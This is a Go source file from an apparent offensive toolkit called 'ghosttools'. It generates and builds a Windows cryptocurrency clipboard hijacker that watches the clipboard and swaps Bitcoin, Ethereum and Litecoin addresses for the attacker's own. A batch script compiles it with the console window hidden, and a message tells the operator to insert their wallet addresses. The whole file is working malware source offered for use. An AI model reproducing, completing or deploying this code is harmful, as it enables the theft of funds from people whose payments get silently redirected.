package malicious

import (
    "os"
    "path/filepath"

    "ghosttools/internal/ui"
)

func CryptoClipper() {
    ui.Cyan("building crypto clipper...")
    out := "ghosttools_clipper"
    os.MkdirAll(out, 0755)

    src := `package main

import (
    "os"
    "strings"
    "syscall"
    "time"
    "unsafe"
)

var (
    user32 = syscall.NewLazyDLL("user32.dll")
    kernel32 = syscall.NewLazyDLL("kernel32.dll")
    procOpenClipboard = user32.NewProc("OpenClipboard")
    procGetClipboardData = user32.NewProc("GetClipboardData")
    procSetClipboardData = user32.NewProc("SetClipboardData")
    procCloseClipboard = user32.NewProc("CloseClipboard")
    procEmptyClipboard = user32.NewProc("EmptyClipboard")
    procGlobalAlloc = kernel32.NewProc("GlobalAlloc")
    procGlobalLock = kernel32.NewProc("GlobalLock")
)

const (
    CF_TEXT = 1
    YOUR_BTC = "bc1q..."
    YOUR_ETH = "0x..."
    YOUR_LTC = "ltc1..."
)

func main() {
    for {
        if txt := getClip(); txt != "" {
            n := normalize(txt)
            if isBTC(n) && !strings.Contains(n, "bc1q") { setClip(YOUR_BTC) }
            if isETH(n) && !strings.Contains(n, "0x") { setClip(YOUR_ETH) }
            if isLTC(n) && !strings.Contains(n, "ltc1") { setClip(YOUR_LTC) }
        }
        time.Sleep(500 * time.Millisecond)
    }
}

func getClip() string {
    procOpenClipboard.Call(0)
    defer procCloseClipboard.Call()
    h, _, _ := procGetClipboardData.Call(CF_TEXT)
    if h == 0 { return "" }
    p, _, _ := procGlobalLock.Call(h)
    if p == 0 { return "" }
    return syscall.BytePtrToString((*byte)(unsafe.Pointer(p)))
}

func setClip(s string) {
    procOpenClipboard.Call(0)
    procEmptyClipboard.Call()
    b := append([]byte(s), 0)
    h, _, _ := procGlobalAlloc.Call(0x2000, uintptr(len(b)))
    p, _, _ := procGlobalLock.Call(h)
    copy((*[1 << 20]byte)(unsafe.Pointer(p))[:len(b)], b)
    procSetClipboardData.Call(CF_TEXT, h)
    procCloseClipboard.Call()
}

func normalize(s string) string {
    return strings.TrimSpace(s)
}

func isBTC(s string) bool {
    return (strings.HasPrefix(s, "1") || strings.HasPrefix(s, "3") || strings.HasPrefix(s, "bc1")) && len(s) >= 26 && len(s) <= 62
}
func isETH(s string) bool {
    return strings.HasPrefix(s, "0x") && len(s) == 42
}
func isLTC(s string) bool {
    return (strings.HasPrefix(s, "L") || strings.HasPrefix(s, "M") || strings.HasPrefix(s, "ltc1")) && len(s) >= 26 && len(s) <= 62
}
`
    os.WriteFile(filepath.Join(out, "main.go"), []byte(src), 0644)
    build := `@echo off
go build -ldflags "-s -w -H=windowsgui" -o clipper.exe main.go
`
    os.WriteFile(filepath.Join(out, "build.bat"), []byte(build), 0644)
    ui.Green("clipper built in ./ghosttools_clipper/")
    ui.Yellow("replace BTC/ETH/LTC addresses in main.go before build.")
}